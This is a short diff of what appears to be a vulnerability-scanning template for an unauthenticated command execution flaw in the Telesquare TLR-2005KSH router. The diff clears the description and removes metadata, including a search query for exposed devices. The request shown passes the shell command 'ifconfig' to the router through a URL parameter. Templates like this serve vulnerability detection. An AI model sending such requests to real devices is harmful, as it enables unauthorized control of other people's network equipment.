@@ -3,12 +3,8 @@ info:
   name: Telesquare TLR-2005KSH路由器未经授权的远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qnzwq3vv8dmyuplf'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qnzwq3vv8dmyuplf
-    fofa: title="Login to TLR-2005KSH"
 http:
 - raw:
   - 'GET /cgi-bin/admin.cgi?Command=sysCommand&Cmd=ifconfig HTTP/1.1
